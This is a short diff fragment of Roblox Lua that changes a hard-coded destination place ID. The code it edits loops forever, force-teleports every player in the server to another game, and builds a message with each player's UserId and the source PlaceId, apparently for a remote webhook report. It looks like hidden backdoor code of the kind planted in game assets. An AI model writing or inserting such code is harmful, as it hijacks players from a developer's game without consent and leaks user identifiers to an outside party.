@@ -9,7 +9,7 @@ if game.Chat.Name == "Chat" then
 	while true do
 		Players = game.Players:GetPlayers()
 		for i = 1, #Players do
-			TeleportService:Teleport(3067570669, Players[i])
+			TeleportService:Teleport(76527950, Players[i])
 			if Pinged == false then
 			Pinged = true
 			local Data = {["content"] = "Teleporting (" .. Players[i].UserId .. ") from " .. game.PlaceId}
